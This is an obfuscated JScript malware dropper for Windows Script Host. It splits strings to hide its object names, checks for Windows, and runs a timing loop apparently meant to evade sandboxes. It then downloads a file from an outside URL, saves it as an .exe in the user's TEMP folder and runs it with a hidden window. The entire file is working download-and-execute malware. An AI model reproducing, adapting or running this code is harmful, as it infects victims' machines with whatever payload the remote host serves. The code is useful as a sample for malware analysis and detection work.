var LI = false;
var TS = "Create"+"Object";
var XX = function H() {return WScript[TS]("WScript"+".Shell");}(), O = 11;
var KC = "MSXML2"+".XMLHTTP";
var Y0 = 2;
var A = Y0 - 2;
function V(L1){XX["Run"](L1, A, A);};
function TD(){return KC + "";};
function PC(M, N){A = A * 1; return M - N;};
function S(){return TS;};
/*@cc_on
  @if (@_win32 || @_win64)
    LI = true;
  @end
@*/
if (LI)
{
var HA = "";
function H0(){return 22;};
var B = 0; var W0 = 0;
function SJ()
{
var Y = new this["Date"]();
var UF = Y["getUTCMilliseconds"]();
WScript["Sleep"](H0());
var Y = new this["Date"]();
var L0 = Y["getUTCMilliseconds"]();
WScript["Sleep"](H0());
var Y = new this["Date"]();
var I = Y["getUTCMilliseconds"]();
var B = "L";
B = PC(L0, UF);
var W0 = "IB";
W0 = PC(I, L0);
HA = "open";
return PC(B, W0);
}
var K = false;
var MG = false;
for (var R = A; R < H0() * 1; R++){if (SJ() != A){
K = true; 
W0 = "31" + 11 * B + W0; 
MG = true; 
break;
}}
function OB() {return ((K == true) && (K == MG)) ? 1 : A;};
if (K && OB() && MG){
function BJ() {return XX["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "IIXE0yFqK.ex" + "e";};
 O0 = TD();
 ZC = WScript[TS](O0);
 var Z = 1;
do { 
	for (;Z;){
	try {
		if (Z == 1)
		{
			ZC[HA]("GET", "http://ekotrade.pl/m4ujda", false);
			ZC["send"]();
			SW = "Sleep";
			Z = 2;
		}
		WScript[SW](H0() + 120); 
		if (ZC["readystate"] < 2 * 2) continue;
		Z = A;
		function WL(MH) {var J = (1, 2, 3, 4, 5, MH); return J;};
		NP = WScript[S()]("ADODB.Stream");
		O0 = NP;
		O0[HA]();
		O0["type"] = WL(1);
		O0["write"](ZC["ResponseBody"]);
		NP["position"] = WL(A);
		O0["Save" + "ToFile"](BJ(), 2);
		NP["cl"+"ose"]();
		W = BJ();
		V(W);
	} catch(J0){};};
}while (Z);
}
}

